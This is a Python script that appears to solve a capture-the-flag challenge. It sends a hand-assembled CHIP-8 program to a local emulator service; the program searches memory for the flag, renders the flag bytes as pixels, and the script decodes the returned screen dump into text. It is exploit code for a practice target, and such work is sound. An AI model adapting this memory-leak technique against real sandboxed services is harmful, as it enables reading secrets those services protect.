#!/usr/bin/env python3

import base64
import subprocess
import socket

CODE = """
# find beginning of flag in memory
200: A9C2 # start search at 2500-2
202: 6902 # push 2 on V9 <--- jump from 20A
204: F91E # increment I by 2 (V9)
206: F865 # load 8 bytes of memory into registers
208: 4000 # skip next instruction if V0 (pointer in memory) is != 0
20A: 1202 # jump back to 202
20C: F91E # increment I by 2 (to skip the code before the actual flag begins)

# draw flag bytes as pixels to framebuffer
20E: 6A00 # push 0 on V10(X)
210: 6B00 # push 0 on V11(Y) <--- jump from 224
212: 6C10 # push 16 on V12
214: DABF # "draw" 16 bytes of flag to screen
216: FC1E # increment I by 16 (V12)
218: 6B10 # push 16 on V11(Y)
21A: DABF # "draw" 16 bytes of flag to screen
21C: FC1E # increment I by 16 (V12)
21E: 7A08 # increment V10(X) by 8
220: F865 # load 8 bytes of memory into registers
222: 3000 # skip next instruction if V0 (pointer in memory) is == 0
224: 1210 # jump back to 210

# cause abort, outputs current framebuffer
226: 1226 # abort
"""

MEM = ([0] * 512)

for line in CODE.splitlines():
    line = line.strip().split("#")[0].split(":")
    if len(line) == 1:
        continue
    addr = int(line[0].strip(), 16) - 0x200
    instr = bytes.fromhex(line[1].strip())
    MEM[addr] = instr[0]
    MEM[addr+1] = instr[1]

MEM = bytes(MEM)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 2384))

buf = b""
while b"> " not in buf:
    buf += sock.recv(1)

sock.send(base64.b64encode(MEM) + b"\n")

output = b""
while len(output.splitlines()) < 33:
    output += sock.recv(1024)
output = output.decode()
output = output.replace("\u2588", "1")
output = output.replace(" ", "0")
output = output.splitlines()[1:]

flag = ""
for i in range(32*8):
    row = i % 32
    col = i // 32

    binary = output[row][col*8:col*8+8]
    if binary == "00000000":
        continue

    flag += chr(int(binary, 2))

print(flag)
